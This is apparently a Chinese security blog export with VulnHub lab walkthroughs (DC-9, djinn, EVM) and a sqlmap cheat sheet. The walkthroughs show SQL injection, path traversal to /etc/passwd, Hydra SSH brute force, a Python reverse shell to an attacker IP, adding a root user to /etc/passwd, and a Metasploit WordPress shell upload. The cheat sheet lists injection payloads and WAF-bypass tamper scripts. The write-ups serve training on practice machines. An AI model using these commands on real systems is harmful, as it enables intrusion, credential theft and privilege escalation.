<p>提示输入first name或者last name进行查询  测试一下发现出来了所有人的信息 这里存在注入 先用burpsuite抓一下包  然后用sqlmap跑数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mary&#39;or &#39;1&#39;&#x3D;1&#39;</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/DC-9 img/4.png" style="zoom:50%;" />

<p>然后将post包数据复制到txt文件里  用sqlmap跑数据库</p>
<img data-src="/images/vulnhub/DC-9 img/5.png" style="zoom:50%;" />

<p>然后就跑sqlmap  三个数据库  跑一下Staff和users</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -3 sqlmap.py -r oslo.txt --dbs</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/DC-9 img/6.png" style="zoom:50%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -3 sqlmap.py -r oslo.txt -D users --tables</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/DC-9 img/7.png" style="zoom:50%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -3 sqlmap.py -r oslo.txt -D users -T UserDetails --columns</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/DC-9 img/8.png" style="zoom:50%;" />

<p>然后直接所有数据dump下来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -3 sqlmap.py -r oslo.txt -D users -T UserDetails --dump</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/DC-9 img/9.png" style="zoom:50%;" />

<p>在跑一下Staff数据库  更上面是一样的</p>
<img data-src="/images/vulnhub/DC-9 img/10.png" style="zoom:50%;" />

<img data-src="/images/vulnhub/DC-9 img/11.png" style="zoom:50%;" />

<p>这里有个admin的账号和密码  密码是hash 但是sqlmap有自带的简单hash破解 可以先试一下</p>
<img data-src="/images/vulnhub/DC-9 img/12.png" style="zoom:50%;" />

<p>得到一个admin/transorbital1</p>
<p>网站有个登录页面  登录试试  登录进去了 下面有个很显眼的提示文件不存在</p>
<img data-src="/images/vulnhub/DC-9 img/13.png" style="zoom:50%;" />



<p>这里应该可以任意文件读取 构造参数如下  先读一下用户文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p>可以看到都是和之前跑出来的数据库里的用户是对应的</p>
<img data-src="/images/vulnhub/DC-9 img/14.png" style="zoom:50%;" />

<p>那么我们就可以进行下一步的撞库了 分别新建一个user.txt和pass.txt</p>
<img data-src="/images/vulnhub/DC-9 img/15.png" style="zoom:50%;" />

<p>然后我们用Hydra来爆破ssh登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt 192.168.0.114 ssh</span><br></pre></td></tr></table></figure>

<p>然后拒绝连接 emm…</p>
<img data-src="/images/vulnhub/DC-9 img/16.png" style="zoom:50%;" />

<p>我们又看到最开始扫端口的地方 22端口的状态的filtered 连接会被过滤</p>
<p>后门google了一波  才知道要先端口敲门 有一串特定的序列在 /etc/knockd.conf 文件中 因为靶机使用了knockd来进行防护</p>
<p>先读配置文件 </p>
<p>![](/images/vulnhub/DC-9 img/17.png)</p>
<p>然后进行端口敲门</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">knock 192.168.0.114 7469 8475 9842</span><br></pre></td></tr></table></figure>

<p>然后在hydra爆破登录     找到三个可登录用户</p>
<img data-src="/images/vulnhub/DC-9 img/18.png" style="zoom:60%;" />

<p>先每个登录一遍  只有登录第三个用户时发现有东西了</p>
<p>发现一个存储密码的文件</p>
<img data-src="/images/vulnhub/DC-9 img/19.png" style="zoom:60%;" />

<p>然后查看权限 sudo -l  会发现一个无需root密码执行的test文件</p>
<img data-src="/images/vulnhub/DC-9 img/20.png" style="zoom:60%;" />

<p>先查看一下test.py文件的内容 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">if len(sys.argv) !&#x3D; 3:</span><br><span class="line">	print(&quot;Usage: python test.py read append&quot;)</span><br><span class="line">	sys.exit(1)</span><br><span class="line">else:</span><br><span class="line">	f &#x3D; open(sys.argv[1], &quot;r&quot;)</span><br><span class="line">	output &#x3D; (f.read())</span><br><span class="line">	</span><br><span class="line">	f &#x3D; open(sys.argv[2], &quot;a&quot;)</span><br><span class="line">	f.write(output)</span><br><span class="line">	f.close()</span><br></pre></td></tr></table></figure>

<p>看一下代码不难发现 这是将第一个参数文件名中的内容写入到第二个文件中</p>
<p>这里我们就可以用openssl生成一个root用户 然后写进/etc/passwd/文件中</p>
<p>然后切换用户就是root了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt oslo 123456</span><br><span class="line">echo &#39;oslo:$1$oslo$qv9M3fBmtDPrOTBZflNl81:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;tmp&#x2F;osl</span><br><span class="line">sudo test &#x2F;tmp&#x2F;osl &#x2F;etc&#x2F;passwd</span><br><span class="line">su oslo</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/DC-9 img/21.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/DC-9 img/22.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/DC-9 img/23.png" style="zoom:60%;" />

<p>By oslo(A fake hacker)</p>
<h1 id="djinn-Walkthrough"><a href="#djinn-Walkthrough" class="headerlink" title="djinn Walkthrough"></a>djinn Walkthrough</h1><p>第一步先打开靶机  </p>
<p>这次是个ubuntu的靶机 先确定一下IP</p>
<img data-src="/images/vulnhub/djinn img/1.png" style="zoom:60%;" />

<p>浏览器访问一下 看看页面  浏览器访问不了 还是先扫一下端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nmap -sS -sV -T5 -A -p- 192.168.0.114</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/djinn img/2.png" style="zoom:60%;" />

<p>又有个匿名ftp登录的 还有三个文件</p>
<p>还有其他的1337 7331端口开着  后面再看这些端口什么用</p>
<img data-src="/images/vulnhub/djinn img/3.png" style="zoom:60%;" />

<p>先匿名ftp看一下  先下载哪三个文件下来看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 192.168.0.114</span><br></pre></td></tr></table></figure>

<p>用户名和密码都填ftp就行 然后下载三个文件下来看看</p>
<img data-src="/images/vulnhub/djinn img/4.png" style="zoom:60%;" />

<p>然后在kali机上面查看一下 提示在1337有个游戏 还得到一个用户名nitish81299</p>
<img data-src="/images/vulnhub/djinn img/5.png" style="zoom:60%;" />

<p>然后我们直接telnet1377端口看看</p>
<img data-src="/images/vulnhub/djinn img/6.png" style="zoom:60%;" />

<p>发现就是不断做数学题  要做1000次  这不可能啊 再去看看其他的 先去看了看7331端口的http页面 然后用dirsearch还有gobuster跑一遍目录 </p>
<p>![](/images/vulnhub/djinn img/7.png)</p>
<img data-src="/images/vulnhub/djinn img/8.png" style="zoom:60%;" />

<p>然后访问一下  发现是个命令执行的页面  执行命令后返回如下</p>
<img data-src="/images/vulnhub/djinn img/9.png" style="zoom:60%;" />

<p> 然后ping一下我的kali机  发现不行  应该被过滤了</p>
<img data-src="/images/vulnhub/djinn img/10.png" style="zoom:60%;" />

<p>然后再抓包看看 什么命令可以执行 什么不可以执行</p>
<img data-src="/images/vulnhub/djinn img/11.png" style="zoom:60%;" />

<p>上面我们使用了echo whoami 说明echo可以执行</p>
<p>下面我们对getshell的 payoad进行base64编码 然后使用echo命令执行 kali机监听端口 看看是否反弹端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.104&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/djinn img/12.png" style="zoom:60%;" />

<p>确实getshell了</p>
<p>然后去到/home目录下发现了个用户 一个nitish 一个sam</p>
<p>在nitish下有个user.txt 但是没有权限进入sam目录</p>
<img data-src="/images/vulnhub/djinn img/13.png" style="zoom:60%;" />

<p>那么下面我们就应该是要切换用用户sam 然后再去找提权的东西了</p>
<p>然后我们还在nitish目录下发现了nitish用户的密码</p>
<img data-src="/images/vulnhub/djinn img/14.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/djinn img/15.png" style="zoom:60%;" />

<p>然后执行了suod -l后发现一个可以以sam权限执行的文件</p>
<img data-src="/images/vulnhub/djinn img/16.png" style="zoom:60%;" />

<p>先执行一遍 看看是什么东西</p>
<img data-src="C:\Users\Administrator\Desktop\Folders\blog\djinn img\17.png" style="zoom:60%;" />

<p>给出了使用说明书 一个一个执行一遍 发现都不能获取sam的权限shell</p>
<p>然后使用了man命令查看完整的说明书 发现了一个参数 cmd</p>
<img data-src="/images/vulnhub/djinn img/18.png" style="zoom:60%;" />

<p>然后在cmd参数后面跟上命令 就直接到了sam用户权限</p>
<img data-src="/images/vulnhub/djinn img/19.png" style="zoom:60%;" />

<p>然后再次查看sudo -l 又发现一个lago文件</p>
<img data-src="/images/vulnhub/djinn img/20.png" style="zoom:60%;" />

<p>再次执行了一遍</p>
<img data-src="/images/vulnhub/djinn img/21.png" style="zoom:60%;" />

<p>发现每个功能都不能成功实现 那就去看看源码 在sam用户名目录下发现了一个pyc文件 这是py文件编译后的文件 需要源码的话 我们可以将pyc文件下载到本地 然后在线反编译就可以了</p>
<img data-src="/images/vulnhub/djinn img/22.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/djinn img/23.png" style="zoom:60%;" />

<p>在线反编译后看源码 发现只有一个函数是真正有用的 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def guessit():</span><br><span class="line">    num &#x3D; randint(1, 101)</span><br><span class="line">    print &#39;Choose a number between 1 to 100: &#39;</span><br><span class="line">    s &#x3D; input(&#39;Enter your number: &#39;)</span><br><span class="line">    if s &#x3D;&#x3D; num:</span><br><span class="line">        system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">    else:</span><br><span class="line">        print &#39;Better Luck next time&#39;</span><br></pre></td></tr></table></figure>

<p>这里在input这里有个漏洞 </p>
<p>直接输入变量名就是导致条件成立  然后获取shell</p>
<img data-src="/images/vulnhub/djinn img/24.png" style="zoom:60%;" />

<img data-src="/images/vulnhub/djinn img/25.png" style="zoom:60%;" />

<p>By oslo(A fake hacker)</p>
<h1 id="VulnHub-EVM-WalkThrough"><a href="#VulnHub-EVM-WalkThrough" class="headerlink" title="VulnHub EVM WalkThrough"></a>VulnHub EVM WalkThrough</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">靶机地址：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;evm-1,391&#x2F;</span><br><span class="line">靶机说明：This is super friendly box intended for Beginner&#39;s</span><br><span class="line">这次是一个很简单的靶机 考试之前做来玩玩</span><br></pre></td></tr></table></figure>

<p>下载ova文件后使用virtualbox打开 先用namp确定IP</p>
<img data-src="/images/vulnhub/EVM Iimg/1.png" style="zoom:50%;" />

<p>同时也可以扫一下端口 都是一些默认的服务端口</p>
<img data-src="/images/vulnhub/EVM Iimg/2.png" style="zoom:50%;" />

<p>有了IP 浏览器访问地址 得到一个apach的more界面</p>
<img data-src="/images/vulnhub/EVM Iimg/3.png" style="zoom:50%;" />

<p>还是常规套路 先信息收集 这个是简单靶机的话 就先扫一下目录</p>
<p>先用的dirsearech扫了一下 有个index.html和info.php 都看了一下 没什么特殊的</p>
<p>然后用dirb扫了一下 发现了网站框架是wordpress</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.1.106</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/EVM Iimg/4.png" style="zoom:50%;" />

<p>然后就可以用wpscan扫一下用户和密码了 先扫用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.1.106&#x2F;wordpress -e u</span><br></pre></td></tr></table></figure>

<p>扫到一个c0rrupt3d_brain</p>
<img data-src="/images/vulnhub/EVM Iimg/5.png" style="zoom:50%;" />

<p>然后在用字典跑一下密码 密码：24992499</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.1.106&#x2F;wordpress -U c0rrupt3d_brain -P &#x2F;root&#x2F;桌面&#x2F;passwd.txt</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/EVM Iimg/6.png" style="zoom:50%;" />

<p>然后就可以用msf使用wp的漏洞来反弹shell了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_admin_shell_upload</span><br><span class="line">set rhosts 192.168.1.106</span><br><span class="line">set username c0rrupt3d_brain</span><br><span class="line">ser password 24992499</span><br><span class="line">set targeturi &#x2F;wordpress</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>ok 返回了meterpreter</p>
<img data-src="/images/vulnhub/EVM Iimg/7.png" style="zoom:50%;" />

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home</span><br><span class="line">ls</span><br><span class="line">cd root3r</span><br><span class="line">ls</span><br><span class="line">cat .root_password_ssh.txt</span><br><span class="line">找到root密码：willy26</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/EVM Iimg/8.png" style="zoom:50%;" />

<p>然后创建交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>

<img data-src="/images/vulnhub/EVM Iimg/9.png" style="zoom:50%;" />

<p>root密码就是刚刚的willy26 就这么提权就完了</p>
<img data-src="/images/vulnhub/EVM Iimg/10.png" style="zoom:50%;" />

<p> By Oslo(A fake hacker) </p>
]]></content>
      <categories>
        <category>Walkthrough</category>
      </categories>
      <tags>
        <tag>VulnHub</tag>
        <tag>Walkthrough</tag>
      </tags>
  </entry>
  <entry>
    <title>SqlMap使用小记</title>
    <url>/2020/03/18/SqlMap%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Sqlmap使用的小小总结QAQ"><a href="#Sqlmap使用的小小总结QAQ" class="headerlink" title="Sqlmap使用的小小总结QAQ"></a>Sqlmap使用的小小总结QAQ</h1><a id="more"></a> 

<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近在学习使用Sqlmap，看了很多文章，很多很杂，所以自己写一个小小的使用总结</p>
<p>如有不对请多多包涵 : -）</p>
<h2 id="先了解"><a href="#先了解" class="headerlink" title="先了解"></a>先了解</h2><p>SQLmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Acess，IBM DB2，SQLLite，Firebird，Sybase和SAP MaxDB……SQLmap采用几种独特的SQL注入技术，分别是盲推理SQL注入，UNION查询SQL注入，对查询和盲注。其广泛的功能和选项包括数据库指纹，枚举，数据库提取，访问目标文件系统，并在获取完全操作权限时实行任意命令。</p>
<p>当给Sqlmap一个url跑的时候，它会：</p>
<p>1.判断注入时选择的参数</p>
<p>2.判断识别出使用的那种数据库</p>
<p>3.判断注入时使用何种sql注入技术来进行注入</p>
<p>4.根据用户的选择需要，获取相应的需要的数据</p>
<h3 id="Sqlmap支持的五种sql注入："><a href="#Sqlmap支持的五种sql注入：" class="headerlink" title="Sqlmap支持的五种sql注入："></a>Sqlmap支持的五种sql注入：</h3><h4 id="1-基于报错的sql注入"><a href="#1-基于报错的sql注入" class="headerlink" title="1.基于报错的sql注入"></a>1.基于报错的sql注入</h4><h5 id="1）floor报错注入"><a href="#1）floor报错注入" class="headerlink" title="1）floor报错注入"></a>1）floor报错注入</h5><p>经典floor报错注入语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">（1）select count(*),(concat(0x3a,database(),0x3a,floor(rand()*2))) name from information_schema.tables group by name; </span><br><span class="line">（2）select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x</span><br></pre></td></tr></table></figure>

<h5 id="2）UpdateXml报错注入"><a href="#2）UpdateXml报错注入" class="headerlink" title="2）UpdateXml报错注入"></a>2）UpdateXml报错注入</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema&#x3D;database() limit 3,1)),0);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~users&#39;</span><br></pre></td></tr></table></figure>

<p>获取字段名和内容的命令格式类似</p>
<h5 id="3）ExtractValue报错注入"><a href="#3）ExtractValue报错注入" class="headerlink" title="3）ExtractValue报错注入"></a>3）ExtractValue报错注入</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;\users&#39;</span><br></pre></td></tr></table></figure>

<h4 id="2-基于布尔的注入"><a href="#2-基于布尔的注入" class="headerlink" title="2.基于布尔的注入"></a>2.基于布尔的注入</h4><p>通过构造sql语句，通过判断语句是否执行成功来对数据进行猜解。</p>
<p>查看表名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1;</span><br></pre></td></tr></table></figure>

<p>无论输入什么只有正确和错误的，那么就可以判断是基于布尔的注入</p>
<h4 id="3-基于时间的盲注"><a href="#3-基于时间的盲注" class="headerlink" title="3.基于时间的盲注"></a>3.基于时间的盲注</h4><p>基于的原理是，当对数据库进行查询操作，如果查询的条件不存在，语句执行的时间便是0.但往往语句执行的速度非常快，线程信息一闪而过，得到的执行时间基本为0。但是如果查询语句的条件不存在，执行的时间便是0，利用该函数这样一个特殊的性质，可以利用时间延迟来判断我们查询的是否存在。这便是SQL基于时间延迟的盲注的工作原理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)；</span><br></pre></td></tr></table></figure>

<p>与基于布尔注入相比，基于时间的盲注使用了if语句来进行判断</p>
<h4 id="4-联合查询注入（union-injection）"><a href="#4-联合查询注入（union-injection）" class="headerlink" title="4.联合查询注入（union injection）"></a>4.联合查询注入（union injection）</h4><p>联合查询注入的前提条件是页面上有显示为位，在可以使用union的情况下进行联合查询注入</p>
<p>联合注入的过程：</p>
<p>1、判断注入点</p>
<p>2、判断是整型还是字符型</p>
<p>3、判断查询列数</p>
<p>4、判断显示位</p>
<p>5、获取所有数据库名</p>
<p>6、获取数据库所有表名</p>
<p>7、获取字段名</p>
<p>8、获取字段中的数据</p>
<h4 id="5-堆查询注入（stack-injection）"><a href="#5-堆查询注入（stack-injection）" class="headerlink" title="5.堆查询注入（stack injection）"></a>5.堆查询注入（stack injection）</h4><p>堆查询注入也称为堆叠注入，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的，</p>
<p>可以同时执行多条语句的执行时的注入。</p>
<h2 id="安装Sqlmap"><a href="#安装Sqlmap" class="headerlink" title="安装Sqlmap"></a>安装Sqlmap</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;sqlmapproject&#x2F;sqlmap.git sqlmap-test</span><br></pre></td></tr></table></figure>

<h2 id="Sqlmap选项（Options"><a href="#Sqlmap选项（Options" class="headerlink" title="Sqlmap选项（Options)"></a>Sqlmap选项（Options)</h2><p>​    – version 显示程序的版本号并退出<br>​    - h, –help 显示此帮助消息并退出<br>​    - v VERBOSE 详细级别：0-6（默认为 1）</p>
<p>Target(目标)：<br>以下至少需要设置其中一个选项，设置目标 URL。<br>-d DIRECT 直接连接到数据库。<br>-u URL, –url=URL 目标 URL。<br>-l LIST 从 Burp 或 WebScarab 代理的日志中解析目标。<br>-r REQUESTFILE 从一个文件中载入 HTTP 请求。<br>-g GOOGLEDORK 处理 Google dork 的结果作为目标 URL。<br>-c CONFIGFILE 从 INI 配置文件中加载选项。</p>
<p>Request（请求）：:<br>这些选项可以用来指定如何连接到目标 URL。<br>–data=DATA 通过 POST 发送的数据字符串<br>–cookie=COOKIE HTTP Cookie 头<br>–cookie-urlencode URL 编码生成的 cookie 注入<br>–drop-set-cookie 忽略响应的 Set –Cookie 头信息<br>–user-agent=AGENT 指定 HTTP User –Agent 头<br>–random-agent 使用随机选定的 HTTP User-Agent 头<br>–referer=REFERER 指定 HTTP Referer 头<br>–headers=HEADERS 换行分开，加入其他的 HTTP 头<br>–auth-type=ATYPE HTTP 身份验证类型（基本，摘要或 NTLM）(Basic, Digest or NTLM)<br>–auth-cred=ACRED HTTP 身份验证凭据（用户名: 密码）<br>–auth-cert=ACERT HTTP 认证证书（key_file，cert_file）<br>–proxy=PROXY 使用 HTTP 代理连接到目标 URL<br>–proxy-cred=PCRED HTTP 代理身份验证凭据（用户名：密码）<br>–ignore-proxy 忽略系统默认的 HTTP 代理<br>–delay=DELAY 在每个 HTTP 请求之间的延迟时间，单位为秒<br>–timeout=TIMEOUT 等待连接超时的时间（默认为 30 秒）<br>–retries=RETRIES 连接超时后重新连接的时间（默认 3）<br>–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式<br>–safe-url=SAFURL 在测试过程中经常访问的 url 地址<br>–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的 URL</p>
<p>Optimization（优化）：<br>这些选项可用于优化 sqlmap.py 的性能<br>-o 开启所有优化开关<br>–predict-output 预测常见的查询输出<br>–keep-alive 使用持久的 HTTP(S) 连接<br>–null-connection 从没有实际的 HTTP 响应体中检索页面长度<br>–threads=THREADS 最大的 HTTP(S) 请求并发量（默认为 1）</p>
<p>Injection（注入）：<br>这些选项可以用来指定测试哪些参数，提供自定义的注入 payloads 和可选篡改脚本。<br>-p TESTPARAMETER 可测试的参数<br>–dbms=DBMS 强制后端的 DBMS 为此值<br>–os=OS 强制后端的 DBMS 操作系统为这个值<br>–prefix=PREFIX 注入 payload 字符串前缀<br>–suffix=SUFFIX 注入 payload 字符串后缀<br>–tamper=TAMPER 使用给定的脚本篡改注入数据<br>–tamper 通过编码绕过 WEB 防火墙（WAF）sqlmap.py 默认用 char()<br>–tamper 插件所在目录 \ sqlmap-dev\tamper</p>
<ol>
<li>apostrophemask.py 用 UTF-8 全角字符替换单引号字符</li>
<li>apostrophenullencode.py 用非法双字节 unicode 字符替换单引号字符</li>
<li>appendnullbyte.py 在 payload 末尾添加空字符编码</li>
<li>base64encode.py 对给定的 payload 全部字符使用 Base64 编码</li>
<li>between.py 分别用 “NOT BETWEEN 0 AND #” 替换大于号 “&gt;”，“BETWEEN # AND #” 替换等于号“=”</li>
<li>bluecoat.py 在 SQL 语句之后用有效的随机空白符替换空格符，随后用 “LIKE” 替换等于号“=”</li>
<li>chardoubleencode.py 对给定的 payload 全部字符使用双重 URL 编码（不处理已经编码的字符）</li>
<li>charencode.py 对给定的 payload 全部字符使用 URL 编码（不处理已经编码的字符）</li>
<li>charunicodeencode.py 对给定的 payload 的非编码字符使用 Unicode URL 编码（不处理已经编码的字符）</li>
<li>concat2concatws.py 用 “CONCAT_WS(MID(CHAR(0), 0, 0), A, B)” 替换像 “CONCAT(A, B)” 的实例</li>
<li>equaltolike.py 用 “LIKE” 运算符替换全部等于号“=”</li>
<li>greatest.py 用 “GREATEST” 函数替换大于号“&gt;”</li>
<li>halfversionedmorekeywords.py 在每个关键字之前添加 MySQL 注释</li>
<li>ifnull2ifisnull.py 用 “IF(ISNULL(A), B, A)” 替换像 “IFNULL(A, B)” 的实例</li>
<li>lowercase.py 用小写值替换每个关键字字符</li>
<li>modsecurityversioned.py 用注释包围完整的查询</li>
<li>modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</li>
<li>multiplespaces.py 在 SQL 关键字周围添加多个空格</li>
<li>nonrecursivereplacement.py 用 representations 替换预定义 SQL 关键字，适用于过滤器</li>
<li>overlongutf8.py 转换给定的 payload 当中的所有字符</li>
<li>percentage.py 在每个字符之前添加一个百分号</li>
<li>randomcase.py 随机转换每个关键字字符的大小写</li>
<li>randomcomments.py 向 SQL 关键字中插入随机注释</li>
<li>securesphere.py 添加经过特殊构造的字符串</li>
<li>sp_password.py 向 payload 末尾添加 “sp_password” for automatic obfuscation from DBMS logs</li>
<li>space2comment.py 用 “/**/” 替换空格符</li>
<li>space2dash.py 用破折号注释符 “–” 其次是一个随机字符串和一个换行符替换空格符</li>
<li>space2hash.py 用磅注释符 “#” 其次是一个随机字符串和一个换行符替换空格符</li>
<li>space2morehash.py 用磅注释符 “#” 其次是一个随机字符串和一个换行符替换空格符</li>
<li>space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li>
<li>space2mssqlhash.py 用磅注释符 “#” 其次是一个换行符替换空格符</li>
<li>space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li>
<li>space2mysqldash.py 用破折号注释符 “–” 其次是一个换行符替换空格符</li>
<li>space2plus.py 用加号 “+” 替换空格符</li>
<li>space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</li>
<li>unionalltounion.py 用 “UNION SELECT” 替换“UNION ALL SELECT”</li>
<li>unmagicquotes.py 用一个多字节组合 %bf%27 和末尾通用注释一起替换空格符</li>
<li>varnish.py 添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF</li>
<li>versionedkeywords.py 用 MySQL 注释包围每个非函数关键字</li>
<li>versionedmorekeywords.py 用 MySQL 注释包围每个关键字</li>
<li>xforwardedfor.py 添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF</li>
</ol>
<p>Detection（检测）：<br>这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容<br>–level=LEVEL 执行测试的等级（1-5，默认为 1）<br>–risk=RISK 执行测试的风险（0-3，默认为 1）<br>–string=STRING 查询有效时在页面匹配字符串<br>–regexp=REGEXP 查询有效时在页面匹配正则表达式<br>–text-only 仅基于文本内容比较网页</p>
<p>这些选项可用于调整具体的 SQL 注入测试<br>–technique=TECH SQL 注入技术测试（默认 BEUST）<br>Techniques（技巧）：<br>–technique /* 测试指定注入类型 \ 使用的技术<br>不加参数默认测试所有注入技术：<br>B: 基于布尔的 SQL 盲注<br>E: 基于显错 sql 注入<br>U: 基于 UNION 注入<br>S: 叠层 sql 注入<br>T: 基于时间盲注</p>
<p>–time-sec=TIMESEC DBMS 响应的延迟时间（默认为 5 秒）<br>–union-cols=UCOLS 定列范围用于测试 UNION 查询注入<br>–union-char=UCHAR 用于暴力猜解列数的字符</p>
<p>Fingerprint（指纹）：<br>-f, –fingerprint 执行检查广泛的 DBMS 版本指纹</p>
<p>Enumeration（枚举）：<br>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的 SQL 语句<br>-b, –banner 检索数据库管理系统的标识<br>–current-user 检索数据库管理系统当前用户<br>–current-db 检索数据库管理系统当前数据库<br>–is-dba 检测 DBMS 当前用户是否 DBA<br>–users 枚举数据库管理系统用户<br>–passwords 枚举数据库管理系统用户密码哈希<br>–privileges 枚举数据库管理系统用户的权限<br>–roles 枚举数据库管理系统用户的角色<br>–dbs 枚举数据库管理系统数据库<br>–tables 枚举 DBMS 数据库中的表<br>–columns 枚举 DBMS 数据库表列<br>–dump 转储数据库管理系统的数据库中的表项<br>–dump-all 转储所有的 DBMS 数据库表中的条目<br>–search 搜索列，表和 / 或数据库名称<br>-D DB 要进行枚举的数据库名<br>-T TBL 要进行枚举的数据库表<br>-C COL 要进行枚举的数据库列<br>-U USER 用来进行枚举的数据库用户<br>–exclude-sysdbs 枚举表时排除系统数据库<br>–start=LIMITSTART 第一个查询输出进入检索<br>–stop=LIMITSTOP 最后查询的输出进入检索<br>–first=FIRSTCHAR 第一个查询输出字的字符检索<br>–last=LASTCHAR 最后查询的输出字字符检索<br>–sql-query=QUERY 要执行的 SQL 语句<br>–sql-shell 提示交互式 SQL 的 shell</p>
<p>Brute force(蛮力):<br>这些选项可以被用来运行蛮力检查。<br>–common-tables 检查存在共同表<br>–common-columns 检查存在共同列</p>
<p>User-defined function injection（用户自定义函数注入）：<br>这些选项可以用来创建用户自定义函数。<br>–udf-inject 注入用户自定义函数<br>–shared-lib=SHLIB 共享库的本地路径</p>
<p>File system access（访问文件系统）：<br>这些选项可以被用来访问后端数据库管理系统的底层文件系统。<br>–file-read=RFILE 从后端的数据库管理系统文件系统读取文件<br>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件<br>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p>
